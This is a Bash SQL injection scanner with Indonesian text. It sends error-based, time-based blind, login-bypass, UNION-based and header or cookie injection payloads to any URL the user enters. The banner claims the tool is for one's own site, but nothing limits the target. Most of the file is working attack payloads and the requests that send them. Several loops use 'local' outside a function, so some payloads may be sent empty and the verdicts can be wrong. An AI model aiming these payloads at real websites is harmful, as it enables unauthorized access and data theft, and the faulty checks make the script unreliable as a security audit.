#!/bin/bash
# ============================================
#   🥷 SQLi TESTER v3.0 — GACOR EDITION
#   Classic • Error • Time • Union • Header
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; NC='\033[0m'

[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

clear
echo -e "${MAGENTA}╔════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║  🥷 SQLi TESTER v3.0 — GACOR EDITION       ║${NC}"
echo -e "${MAGENTA}║  (Untuk web sendiri, jangan buat jahil!)   ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════╝${NC}"
echo ""

read -p "👉 Masukkan URL Web (contoh: https://gold.domain.com/login.php): " TARGET_URL
[[ -z "$TARGET_URL" ]] && { echo -e "${RED}❌ URL Kosong!${NC}"; exit 1; }

if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    echo -e "${RED}❌ URL harus diawali http:// atau https://${NC}"; exit 1
fi

# Buat folder hasil scan
RESULT_DIR="/root/sqli-results"
mkdir -p "$RESULT_DIR"
RESULT_FILE="$RESULT_DIR/scan_$(date +%Y%m%d_%H%M%S).txt"

echo -e "\n${CYAN}[1/6] Cek Target...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL")
if [[ "$HTTP_CODE" != "200" ]]; then
    echo -e "${RED}❌ Target mati (HTTP $HTTP_CODE)${NC}"; exit 1
fi
echo -e "${GREEN}  ✓ Target Hidup (HTTP 200)${NC}"

VULN=0
TOTAL_TESTS=0
START_TIME=$(date +%s)

# Fungsi helper
run_test() {
    local label="$1"
    local payload="$2"
    local method="$3"  # GET atau POST
    
    TOTAL_TESTS=$((TOTAL_TESTS+1))
    local encoded=$(printf %s "$payload" | jq -sRr @uri)
    
    if [[ "$method" == "POST" ]]; then
        RESP=$(curl -s -L -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=${encoded}&password=test" \
            "$TARGET_URL" 2>&1)
    else
        RESP=$(curl -s -L "$TARGET_URL?username=${encoded}&password=test" 2>&1)
    fi
    
    # Cek indikasi error SQL
    if echo "$RESP" | grep -qiE "sql syntax|mysql_fetch|mysqli_|PDOException|syntax error|unclosed quotation|Warning.*mysql|XPATH syntax|UPDATEXML|EXTRACTVALUE"; then
        echo -e "${RED}  🚨 [VULNERABLE] $label | Payload: $payload${NC}"
        echo "VULNERABLE: $label | Payload: $payload" >> "$RESULT_FILE"
        VULN=$((VULN+1))
        return 1
    fi
    echo -e "${GREEN}  ✓ [SAFE] $label${NC}"
    return 0
}

# ============================================
# TEST 1: ERROR-BASED (Deep)
# ============================================
echo -e "\n${CYAN}[2/6] TEST 1: Error-Based SQL Injection...${NC}"
PAYLOADS_ERR=(
    "admin'"
    "admin''"
    "\""
    "\\"
    "admin' AND 1=CONVERT(int, (SELECT @@version))--"
    "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--"
    "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--"
)
for P in "${PAYLOADS_ERR[@]}"; do
    run_test "Error-Based" "$P" "POST"
done

# ============================================
# TEST 2: TIME-BASED (Blind SQLi)
# ============================================
echo -e "\n${CYAN}[3/6] TEST 2: Time-Based Blind SQLi (Tunggu 3 detik)...${NC}"
PAYLOADS_TIME=(
    "admin' OR SLEEP(3)--"
    "admin' AND SLEEP(3)--"
    "admin' OR (SELECT 1 FROM (SELECT SLEEP(3))a)--"
    "admin' OR BENCHMARK(10000000, MD5('test'))--"
)
for P in "${PAYLOADS_TIME[@]}"; do
    TOTAL_TESTS=$((TOTAL_TESTS+1))
    local encoded=$(printf %s "$P" | jq -sRr @uri)
    
    local start=$(date +%s)
    curl -s -L -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${encoded}&password=test" \
        "$TARGET_URL" > /dev/null 2>&1
    local end=$(date +%s)
    local duration=$((end - start))
    
    if [[ $duration -ge 3 ]]; then
        echo -e "${RED}  🚨 [VULNERABLE] Time-Based | Payload: $P | Delay: ${duration}s${NC}"
        echo "VULNERABLE: Time-Based | Payload: $P | Delay: ${duration}s" >> "$RESULT_FILE"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  ✓ [SAFE] Time-Based | Respon ${duration}s${NC}"
    fi
done

# ============================================
# TEST 3: AUTH BYPASS
# ============================================
echo -e "\n${CYAN}[4/6] TEST 3: Auth Bypass (Login Tanpa Password)...${NC}"
PAYLOADS_AUTH=(
    "admin' --"
    "admin'#"
    "admin'/*"
    "' OR '1'='1"
    "' OR 1=1--"
    "admin' OR '1'='1' --"
    "') OR ('1'='1"
    "admin')--"
)
for P in "${PAYLOADS_AUTH[@]}"; do
    TOTAL_TESTS=$((TOTAL_TESTS+1))
    local encoded=$(printf %s "$P" | jq -sRr @uri)
    
    RESP=$(curl -s -L -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${encoded}&password=anypassword" \
        "$TARGET_URL" 2>&1)
    
    # Cek apakah login bypass berhasil (indikasi halaman dashboard/logout muncul)
    if echo "$RESP" | grep -qiE "logout|dashboard|welcome|profil" && \
       ! echo "$RESP" | grep -qiE "salah|error|invalid|gagal|ditolak"; then
        echo -e "${RED}  🚨 [VULNERABLE] Auth Bypass | Payload: $P${NC}"
        echo "VULNERABLE: Auth Bypass | Payload: $P" >> "$RESULT_FILE"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  ✓ [SAFE] Auth Bypass | $P${NC}"
    fi
done

# ============================================
# TEST 4: UNION-BASED
# ============================================
echo -e "\n${CYAN}[5/6] TEST 4: Union-Based SQLi...${NC}"
PAYLOADS_UNION=(
    "admin' UNION SELECT NULL--"
    "admin' UNION SELECT NULL,NULL--"
    "admin' UNION SELECT NULL,NULL,NULL--"
    "admin' UNION SELECT 1,2,3,4,5--"
    "admin' UNION SELECT user(),database(),version()--"
)
for P in "${PAYLOADS_UNION[@]}"; do
    run_test "Union-Based" "$P" "POST"
done

# ============================================
# TEST 5: HEADER & COOKIE INJECTION
# ============================================
echo -e "\n${CYAN}[6/6] TEST 5: Header & Cookie Injection...${NC}"

# User-Agent
TOTAL_TESTS=$((TOTAL_TESTS+1))
START_UA=$(date +%s)
curl -s -L -A "admin' OR SLEEP(3)--" "$TARGET_URL" > /dev/null 2>&1
END_UA=$(date +%s)
DUR_UA=$((END_UA - START_UA))
if [[ $DUR_UA -ge 3 ]]; then
    echo -e "${RED}  🚨 [VULNERABLE] User-Agent Injection | Delay: ${DUR_UA}s${NC}"
    echo "VULNERABLE: User-Agent Injection" >> "$RESULT_FILE"
    VULN=$((VULN+1))
else
    echo -e "${GREEN}  ✓ [SAFE] User-Agent${NC}"
fi

# X-Forwarded-For
TOTAL_TESTS=$((TOTAL_TESTS+1))
START_XFF=$(date +%s)
curl -s -L -H "X-Forwarded-For: 127.0.0.1' OR SLEEP(3)--" "$TARGET_URL" > /dev/null 2>&1
END_XFF=$(date +%s)
DUR_XFF=$((END_XFF - START_XFF))
if [[ $DUR_XFF -ge 3 ]]; then
    echo -e "${RED}  🚨 [VULNERABLE] X-Forwarded-For Injection | Delay: ${DUR_XFF}s${NC}"
    echo "VULNERABLE: X-Forwarded-For Injection" >> "$RESULT_FILE"
    VULN=$((VULN+1))
else
    echo -e "${GREEN}  ✓ [SAFE] X-Forwarded-For${NC}"
fi

# Cookie
TOTAL_TESTS=$((TOTAL_TESTS+1))
START_COOKIE=$(date +%s)
curl -s -L -b "session=admin' OR SLEEP(3)--" "$TARGET_URL" > /dev/null 2>&1
END_COOKIE=$(date +%s)
DUR_COOKIE=$((END_COOKIE - START_COOKIE))
if [[ $DUR_COOKIE -ge 3 ]]; then
    echo -e "${RED}  🚨 [VULNERABLE] Cookie Injection | Delay: ${DUR_COOKIE}s${NC}"
    echo "VULNERABLE: Cookie Injection" >> "$RESULT_FILE"
    VULN=$((VULN+1))
else
    echo -e "${GREEN}  ✓ [SAFE] Cookie${NC}"
fi

# ============================================
# HASIL AKHIR
# ============================================
END_TIME=$(date +%s)
DURATION_TOTAL=$((END_TIME - START_TIME))

echo -e "\n${CYAN}╔════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║         HASIL PEMINDAIAN (SCAN)            ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════╝${NC}"
echo -e "  🎯 Target       : $TARGET_URL"
echo -e "  📊 Total Test   : $TOTAL_TESTS"
echo -e "  ⏱️  Waktu Scan   : ${DURATION_TOTAL} detik"
echo -e "  🚨 Celah Ditemukan: $VULN"
echo ""

if [[ $VULN -eq 0 ]]; then
    echo -e "${GREEN}╔════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║  🛡️  WEB KEBAL DARI SQL INJECTION!         ║${NC}"
    echo -e "${GREEN}║  Level Keamanan: GILA (A+)                 ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
else
    echo -e "${RED}╔════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🚨 WEB RENTAN SQL INJECTION!              ║${NC}"
    echo -e "${RED}║  Ada $VULN celah. Cek $RESULT_FILE         ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════╝${NC}"
fi
echo ""
echo -e "${CYAN}📁 Hasil detail disimpan di:${NC} $RESULT_FILE"
echo ""
